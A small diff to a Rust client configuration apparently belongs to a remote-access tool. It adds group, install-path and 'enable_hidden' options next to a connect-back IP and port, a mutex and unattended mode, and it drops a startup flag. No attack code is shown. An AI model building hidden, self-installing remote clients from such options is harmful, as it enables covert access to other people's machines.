@@ -4,10 +4,16 @@ pub fn get_config() -> ClientConfig {
     let mut config: ClientConfig = ClientConfig {
         ip: "127.0.0.1".to_string(),
         port: "1337".to_string(),
+        group: "Default".to_string(),
+
+        install: false,
+        file_name: "".to_string(),
+        install_folder: "".to_string(),
+        enable_hidden: false,
+
         mutex_enabled: false,
         mutex: "TEST123".to_string(),
         unattended_mode: false,
-        startup: false,
     };
 
     let config_link_sec: Result<ClientConfig, rmp_serde::decode::Error> = rmp_serde::from_read(
